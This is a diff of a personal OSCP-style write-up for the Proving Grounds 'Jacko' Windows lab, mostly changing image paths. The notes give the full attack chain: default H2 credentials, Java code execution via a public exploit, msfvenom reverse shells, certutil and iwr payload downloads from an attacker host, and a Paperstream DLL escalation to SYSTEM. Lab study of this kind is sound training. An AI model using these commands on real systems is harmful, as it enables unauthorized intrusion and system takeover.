@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-30
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Windows
 Difficulty: Intermediate
@@ -105,7 +106,7 @@ Host script results:
 
 ## Port 80 - HTTP (H2 Database)
 Navigated to `http://192.168.182.66:80` and identified default page for `H2 Database Engine`
-![[Pasted image 20241028212111.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028212111.png]]
 ## Port 135 - MSRPC (Windows RPC)
 
 ## Port 139 & 445 - SMB (Apache)
@@ -113,76 +114,76 @@ Navigated to `http://192.168.182.66:80` and identified default page for `H2 Data
 ## Port 5040 - Unknown
 ## Port 8082 - H2
 - Navigated to `http://192.168.194.66:8082` and identified `H2` login
-![[Pasted image 20241029150929.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029150929.png]]
 - Attempted connection with default credentials `sa:` (No password) and accessed admin panel
-![[Pasted image 20241029151022.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029151022.png]]
 - Ran SQL query `SELECT FILE_READ('C:\Windows\system.ini', NULL);` to test file read ability
-![[Pasted image 20241029151354.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029151354.png]]
  - ## Port 9092 - Unknown
 - Navigated to `http://192.168.194.66:9092` and identified unknown service
-![[Pasted image 20241029150455.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029150455.png]]
 - Saved page and displayed with correct encoding
-![[Pasted image 20241029150806.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029150806.png]]
 
 ---
 # Exploitation
 ## SQL Injection
 Ran `searchsploit "H2"` and identified exploit `49384.txt` to compile and run Java code on target for code execution
-![[Pasted image 20241028215150.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241028215150.png]]
 - Copied Java script from exploit into SQL statement and ran
-![[Pasted image 20241029151723.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029151723.png]]
 - Copied native library script into SQL statement and ran
-![[Pasted image 20241029151804.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029151804.png]]
 - Copied script evaluation into SQL statement and ran with command `whoami` to test - identified user `jacko/tony`
-![[Pasted image 20241029151921.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029151921.png]]
 - Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.162 LPORT=4444 -f exe > revshell.exe` to create reverse shell executable
-![[Pasted image 20241029152945.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029152945.png]]
 - Ran `python3 -m http.server 80` to offer `revshell.exe` on HTTP server
 - Returned to SQL statement and edited command to `certutil -split -urlcache -f http://192.168.45.162/revshell.exe C:\\Users\\tony\\revshell2.exe` to copy reverse shell to user `tony`
-![[Pasted image 20241029153124.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029153124.png]]
 - Started Netcat listener on port `4444`, and ran SQL statement with command `C:\\Users\\tony\\revshell2.exe` and received reverse shell 
-![[Pasted image 20241029154139.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029154139.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Ran `type C:\Users\tony\desktop\local.txt` to print `988d8a67a549358c69a1cab88b594883`
-![[Pasted image 20241029154446.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029154446.png]]
 - Navigated to `C:\Windows\system32` and ran `whoami /priv` - identified `SeImpersonatePrivilege` is `Enabled`
-![[Pasted image 20241029154741.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029154741.png]]
 - Ran `systeminfo` and identified `Windows 10 Build 18363` on `x64` architecture
-![[Pasted image 20241029155127.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029155127.png]]
 - Ran `set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;` to fix error with file path
-![[Pasted image 20241029180455.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029180455.png]]
 - Ran `powershell -ep bypass` to start `Powershell` with scripts allowed
 
 ---
 # Privilege Escalation
 ## Paperstream Exploit #1
 - Enumerated host programs and identified `Paperstream IP`
-![[Pasted image 20241029181039.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029181039.png]]
 - Ran `searchsploit "Paperstream"` - identified & copied exploit `49382.ps1`
-![[Pasted image 20241029181138.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029181138.png]]
 - Updated `49382.ps1` to save `shell.dll` to `C:\Users\tony\`
-![[Pasted image 20241029181316.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029181316.png]]
 - Ran `msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.162 LPORT=4444` to generate `shell.dll` file
 - Ran `iwr -uri http://192.168.45.162/shell.dll -outfile shell.dll` & `iwr -uri http://192.168.45.162/49382.ps1 -outfile paperstreamexploit.ps1` to copy `shell.dll` & `paperstreamexploit.ps1` into `C:\Users\tony` directory from http server
-![[Pasted image 20241029181732.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029181732.png]]
 - Started netcat listener and ran `.\paperstreamexploit.ps1` - payload triggered but no reverse shell received
-![[Pasted image 20241029181902.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241029181902.png]]
 ## Paperstream Exploit #2
 - Referenced https://benheater.com/proving-grounds-jacko/
 - Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=445 -f dll -a x86 --platform windows -e x86/xor_dynamic -b '\x00' -o 0xBEN_privesc.dll` to create new `dll` on x86 architecture with `xor_dynamic`
-![[Pasted image 20241030204712.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241030204712.png]]
 - Updated `49382.ps1` to reflect change in `dll` name
 - Ran `iwr -uri http://192.168.45.169/0xBEN_privesc.dll -outfile 0xBEN_privesc.dll` to copy `0xBEN_privesc.dll` onto target (via python3 http server)
-![[Pasted image 20241030204954.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241030204954.png]]
 - Ran `iwr -uri http://192.168.45.169/49382.ps1 -outfile 49382.ps1` to copy `49382.ps1` onto target (via python3 http server)
-![[Pasted image 20241030205106.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241030205106.png]]
 - Started netcat listener on port `445` and then ran `.\49382.ps1` to execute exploit - received shell as `NT-System`
-![[Pasted image 20241030205222.png]]
-![[Pasted image 20241030205245.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241030205222.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241030205245.png]]
 - Ran `type C:\Users\administrator\desktop\proof.txt` to print `b32d47218e9665058f06833a497a4154`
-![[Pasted image 20241030205406.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241030205406.png]]
 ---
 # Trophy & Loot
 `local.txt` = `988d8a67a549358c69a1cab88b594883`
